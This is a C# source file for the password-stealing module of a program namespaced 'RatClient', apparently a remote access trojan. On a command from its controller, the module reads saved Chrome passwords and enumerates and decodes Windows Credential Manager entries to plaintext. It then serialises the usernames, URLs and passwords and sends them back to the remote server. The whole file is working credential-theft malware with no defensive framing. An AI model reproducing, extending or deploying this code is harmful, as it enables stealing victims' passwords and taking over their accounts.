using System;
using System.Web.Script.Serialization;
using System.Diagnostics;
using System.Collections.Generic;
using RatClient.Features.Password.Chrome;
using System.Runtime.InteropServices;
using System.Text;

namespace RatClient.Features
{
    class PasswordManager
    {
        #region Variables
        public Chrome chrome = new Chrome();
        private readonly Action<object> SendJson;
        #endregion

        public PasswordManager(Action<dynamic> SendJson)
        {
            this.SendJson = SendJson;
            Program.MessageReceived += HandleMessage;
        }

        private void HandleMessage(dynamic message)
        {
            if (message["type"] == "request_passwords")
            {
                SendPasswords();
            }
        }

        public void SendPasswords()
        {
            try
            {
                if (!IsChromeRunning())
                {
                    var chromePasswords = chrome.ReadPasswords();
                    var wcmPasswords = GetWindowsCredentials();
                    
                    var serializedPasswords = new JavaScriptSerializer().Serialize(new
                    {
                        chrome = chromePasswords,
                        wcm = wcmPasswords
                    });
                    
                    SendJson(new { type = "passwords", data = serializedPasswords });
                }
            }
            catch (Exception ex)
            {
                // Log the error or send it back to the server for debugging
                SendJson(new { type = "error", message = "Error retrieving passwords: " + ex.Message });
            }
        }

        private bool IsChromeRunning()
        {
            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            return chromeProcesses.Length > 0;
        }

        #region Windows Credential Manager
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CREDENTIAL
        {
            public uint Flags;
            public uint Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public uint CredentialBlobSize;
            public IntPtr CredentialBlob;
            public uint Persist;
            public uint AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern void CredFree(IntPtr cred);

        private List<CredentialModel> GetWindowsCredentials()
        {
            List<CredentialModel> credentials = new List<CredentialModel>();
            IntPtr pCredentials;
            int count;

            if (CredEnumerate(null, 0, out count, out pCredentials))
            {
                for (int i = 0; i < count; i++)
                {
                    IntPtr credential = Marshal.ReadIntPtr(pCredentials, i * IntPtr.Size);
                    if (credential != IntPtr.Zero)
                    {
                        CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(credential, typeof(CREDENTIAL));

                        string targetName = cred.TargetName != IntPtr.Zero ? Marshal.PtrToStringUni(cred.TargetName) : string.Empty;
                        string userName = cred.UserName != IntPtr.Zero ? Marshal.PtrToStringUni(cred.UserName) : string.Empty;
                        string password = string.Empty;

                        if (cred.CredentialBlob != IntPtr.Zero && cred.CredentialBlobSize > 0)
                        {
                            try
                            {
                                password = Marshal.PtrToStringUni(cred.CredentialBlob, (int)cred.CredentialBlobSize / 2);
                            }
                            catch (ArgumentException)
                            {
                                // If we can't convert to Unicode string, try to read as ASCII
                                byte[] passwordBytes = new byte[cred.CredentialBlobSize];
                                Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                                password = System.Text.Encoding.ASCII.GetString(passwordBytes);
                            }
                        }

                        credentials.Add(new CredentialModel
                        {
                            Url = targetName,
                            Username = userName,
                            Password = password
                        });
                    }
                }

                CredFree(pCredentials);
            }

            return credentials;
        }
        #endregion
    }

    public class CredentialModel
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }
}